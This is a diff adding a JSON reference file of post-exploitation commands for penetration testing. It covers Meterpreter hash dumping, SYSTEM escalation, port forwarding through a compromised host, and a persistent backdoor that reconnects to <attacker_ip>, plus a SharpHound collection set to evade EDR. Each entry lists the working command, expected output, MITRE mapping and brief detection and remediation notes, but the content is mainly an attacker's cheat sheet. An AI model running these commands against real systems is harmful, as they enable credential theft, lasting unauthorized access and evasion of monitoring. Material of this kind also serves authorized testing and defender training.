@@ -1,0 +1,251 @@
+[
+  {
+    "id": "meterpreter-hashdump",
+    "tool": "metasploit",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "linux",
+      "windows"
+    ],
+    "command": "meterpreter > hashdump",
+    "name": "Meterpreter Hash Dump",
+    "description": "Dumps local password hashes from a Meterpreter session.",
+    "arguments": {
+      "hashdump": "Dump SAM hashes"
+    },
+    "expected_output": "Administrator:500:aad3b435...:fc525c96...:::\nGuest:501:aad3b435...:...:::",
+    "use_case": "Quick hash dump from active Meterpreter session.",
+    "prerequisites": [
+      "Meterpreter session",
+      "SYSTEM privileges"
+    ],
+    "mitre_mapping": [
+      "T1003.002"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "LSASS/SAM access"
+    ],
+    "remediation": [
+      "Credential Guard",
+      "LAPS"
+    ],
+    "common_mistakes": [
+      "Not having SYSTEM (use getsystem first)"
+    ],
+    "alternatives": [
+      "mimikatz",
+      "secretsdump"
+    ],
+    "references": [
+      "https://docs.metasploit.com"
+    ],
+    "tags": [
+      "meterpreter",
+      "hashdump",
+      "sam",
+      "quick"
+    ]
+  },
+  {
+    "id": "meterpreter-getsystem",
+    "tool": "metasploit",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "meterpreter > getsystem",
+    "name": "Meterpreter Privilege Escalation",
+    "description": "Attempts multiple techniques to escalate to SYSTEM from admin.",
+    "arguments": {
+      "getsystem": "Try all privesc techniques"
+    },
+    "expected_output": "...got system via technique 1 (Named Pipe Impersonation)",
+    "use_case": "Quick SYSTEM escalation from admin-level Meterpreter session.",
+    "prerequisites": [
+      "Admin-level Meterpreter session"
+    ],
+    "mitre_mapping": [
+      "T1134"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "Named pipe creation",
+      "Token manipulation"
+    ],
+    "remediation": [
+      "Restrict admin access",
+      "Monitor token usage"
+    ],
+    "common_mistakes": [
+      "Not having admin first"
+    ],
+    "alternatives": [
+      "PrintSpoofer",
+      "JuicyPotato"
+    ],
+    "references": [
+      "https://docs.metasploit.com"
+    ],
+    "tags": [
+      "meterpreter",
+      "system",
+      "escalation",
+      "quick"
+    ]
+  },
+  {
+    "id": "meterpreter-portfwd",
+    "tool": "metasploit",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "linux",
+      "windows"
+    ],
+    "command": "meterpreter > portfwd add -l 3389 -p 3389 -r <internal_target>",
+    "name": "Meterpreter Port Forward",
+    "description": "Forwards a port through the Meterpreter session to access internal services.",
+    "arguments": {
+      "portfwd add": "Add port forward",
+      "-l": "Local port",
+      "-p": "Remote port",
+      "-r": "Remote host"
+    },
+    "expected_output": "[*] Forward TCP relay created: 127.0.0.1:3389 -> 10.0.0.5:3389",
+    "use_case": "Access internal services (RDP, databases) through compromised host.",
+    "prerequisites": [
+      "Active Meterpreter session"
+    ],
+    "mitre_mapping": [
+      "T1572"
+    ],
+    "mitre_tactic": "Command and Control",
+    "detections": [
+      "Unusual port forwarding",
+      "Tunnel traffic patterns"
+    ],
+    "remediation": [
+      "Network segmentation",
+      "Monitor for tunneling"
+    ],
+    "common_mistakes": [
+      "Session dies during forward"
+    ],
+    "alternatives": [
+      "chisel",
+      "ssh -L",
+      "ligolo-ng"
+    ],
+    "references": [
+      "https://docs.metasploit.com"
+    ],
+    "tags": [
+      "port-forward",
+      "meterpreter",
+      "pivot",
+      "internal"
+    ]
+  },
+  {
+    "id": "meterpreter-persistence",
+    "tool": "metasploit",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "meterpreter > run persistence -U -i 30 -p 4444 -r <attacker_ip>",
+    "name": "Meterpreter Persistence",
+    "description": "Installs a persistent backdoor that reconnects every 30 seconds.",
+    "arguments": {
+      "-U": "Run at user login",
+      "-i 30": "Reconnect interval",
+      "-p": "Port",
+      "-r": "Attacker IP"
+    },
+    "expected_output": "[*] Persistent agent installed as registry run key",
+    "use_case": "Maintain access even after reboot \u2014 auto-reconnects to attacker.",
+    "prerequisites": [
+      "Meterpreter session"
+    ],
+    "mitre_mapping": [
+      "T1547.001"
+    ],
+    "mitre_tactic": "Persistence",
+    "detections": [
+      "New registry Run key",
+      "Periodic outbound connections"
+    ],
+    "remediation": [
+      "Monitor registry changes",
+      "Application whitelisting",
+      "EDR"
+    ],
+    "common_mistakes": [
+      "Gets detected by AV immediately"
+    ],
+    "alternatives": [
+      "manual registry persistence",
+      "scheduled task"
+    ],
+    "references": [
+      "https://docs.metasploit.com"
+    ],
+    "tags": [
+      "persistence",
+      "backdoor",
+      "registry",
+      "reconnect"
+    ]
+  },
+  {
+    "id": "sharphound-custom",
+    "tool": "bloodhound",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\\temp\\ --stealth",
+    "name": "SharpHound Stealth Collection",
+    "description": "Collects BloodHound data with stealth options \u2014 fewer queries, less detection.",
+    "arguments": {
+      "-c All,GPOLocalGroup": "All data + GPO local groups",
+      "--stealth": "Reduce query volume"
+    },
+    "expected_output": "[*] Stealth mode: single-threaded, reduced queries\n[*] Zip: BloodHound_stealth.zip",
+    "use_case": "Collect AD data while minimizing detection by EDR/SIEM.",
+    "prerequisites": [
+      "Domain user session"
+    ],
+    "mitre_mapping": [
+      "T1087"
+    ],
+    "mitre_tactic": "Discovery",
+    "detections": [
+      "Reduced but still detectable LDAP queries"
+    ],
+    "remediation": [
+      "Monitor LDAP patterns",
+      "EDR rules for SharpHound"
+    ],
+    "common_mistakes": [
+      "Still gets detected by advanced EDR"
+    ],
+    "alternatives": [
+      "bloodhound-python (from Linux)"
+    ],
+    "references": [
+      "https://github.com/SpecterOps/BloodHound"
+    ],
+    "tags": [
+      "bloodhound",
+      "stealth",
+      "collection",
+      "evasion"
+    ]
+  }
+]
